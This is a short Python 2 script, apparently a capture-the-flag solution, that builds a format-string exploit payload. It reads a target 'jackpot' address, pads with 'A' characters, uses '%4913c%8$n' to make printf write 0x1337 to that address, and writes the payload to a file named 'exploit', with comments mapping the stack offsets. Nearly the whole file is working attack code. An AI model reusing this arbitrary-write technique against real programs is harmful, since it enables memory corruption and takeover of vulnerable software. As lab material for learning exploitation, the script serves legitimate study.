import sys

def pack32(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(4, "\x00")
    return s

def pack64(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(8, "\x00")
    return s

jckaddr_str = raw_input()
jckaddr = int(jckaddr_str, 16)
print("Jackpot address: 0x{:016x}".format(jckaddr))

# print() stack, growing upwards:
#   unused      <--- $esp
#   saved $ebp  <--- $ebp
#   saved $eip
#   -- stack frame of fmt_string()
#   "AAAAAA" (6bytes) + "%4" (2bytes)       <-- 6th, start of buf
#   + "913c" (4bytes) + "%8$n" (4bytes)     <-- 7th
#   + pack64(jackaddr)                      <-- 8th
payload = "A" * 6
payload += "%4913c" # 0x1337 = 4919(dec) - 6
payload += "%8$n"
payload += pack64(jckaddr)

e = open("exploit", "w+")
e.write(payload)
